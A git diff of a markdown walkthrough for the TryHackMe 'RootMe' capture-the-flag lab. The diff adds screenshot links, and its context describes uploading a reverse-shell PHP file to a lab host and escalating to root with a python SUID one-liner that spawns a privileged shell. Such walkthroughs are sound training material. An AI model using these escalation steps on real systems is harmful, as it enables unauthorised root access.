@@ -48,6 +48,8 @@ We click on our uploaded file "rev.php5" in http://10.10.188.206/uploads/ and we
 
 We can find the user.txt file with this command : 
 
+![Image Alt](https://github.com/kcoainnapo/Tryhackme/blob/main/RootMe/Images/usertxtflag.png?raw=true)
+
 
 Now we want to enumerate the system to find privilege escalation vectors so we use the following command to find SUID binaries : 
 ```
@@ -58,6 +60,10 @@ And we came accross :
 /usr/bin/python
 ```
 We can go to https://gtfobins.github.io/gtfobins/python/ and use the following command to elevate our privileges and obtain the roor flag : 
+
+![Image Alt](https://github.com/kcoainnapo/Tryhackme/blob/main/RootMe/Images/python-suid.png?raw=true)
+
+
 ```
 /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
